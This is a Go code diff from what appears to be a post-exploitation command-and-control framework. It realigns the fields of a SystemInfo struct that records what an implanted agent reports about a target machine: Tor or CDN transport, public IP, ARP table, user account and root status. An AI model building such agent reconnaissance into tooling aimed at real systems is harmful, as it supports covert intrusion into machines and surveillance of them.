@@ -128,25 +128,24 @@ var ModuleDocs = map[string]string{
 }
 
 type SystemInfo struct {
-	Tag         string   `json:"Tag"`         // identifier of the agent
-	Transport   string   `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
-	Hostname    string   `json:"Hostname"`    // Hostname and machine ID
-	Hardware    string   `json:"Hardware"`    // machine details and hypervisor
-	Container   string   `json:"Container"`   // container tech (if any)
-	CPU         string   `json:"CPU"`         // CPU info
-	Mem         string   `json:"Mem"`         // memory size
-	OS          string   `json:"OS"`          // OS name and version
-	Kernel      string   `json:"Kernel"`      // kernel release
-	Arch        string   `json:"Arch"`        // kernel architecture
-	IP          string   `json:"IP"`          // public IP of the target
-	IPs         []string `json:"IPs"`         // IPs that are found on target's NICs
-	ARP         []string `json:"ARP"`         // ARP table
-	User        string   `json:"User"`        // user account info
-	HasRoot     bool     `json:"HasRoot"`     // is agent run as root?
-	HasTor      bool     `json:"HasTor"`      // is agent from Tor?
-	HasInternet bool     `json:"HasInternet"` // has internet access?
-
-	Process *AgentProcess // agent's process
+	Tag         string        `json:"Tag"`         // identifier of the agent
+	Transport   string        `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
+	Hostname    string        `json:"Hostname"`    // Hostname and machine ID
+	Hardware    string        `json:"Hardware"`    // machine details and hypervisor
+	Container   string        `json:"Container"`   // container tech (if any)
+	CPU         string        `json:"CPU"`         // CPU info
+	Mem         string        `json:"Mem"`         // memory size
+	OS          string        `json:"OS"`          // OS name and version
+	Kernel      string        `json:"Kernel"`      // kernel release
+	Arch        string        `json:"Arch"`        // kernel architecture
+	IP          string        `json:"IP"`          // public IP of the target
+	IPs         []string      `json:"IPs"`         // IPs that are found on target's NICs
+	ARP         []string      `json:"ARP"`         // ARP table
+	User        string        `json:"User"`        // user account info
+	HasRoot     bool          `json:"HasRoot"`     // is agent run as root?
+	HasTor      bool          `json:"HasTor"`      // is agent from Tor?
+	HasInternet bool          `json:"HasInternet"` // has internet access?
+	Process     *AgentProcess `json:"Process"`     // agent's process
 }
 
 // AgentProcess process info of our agent
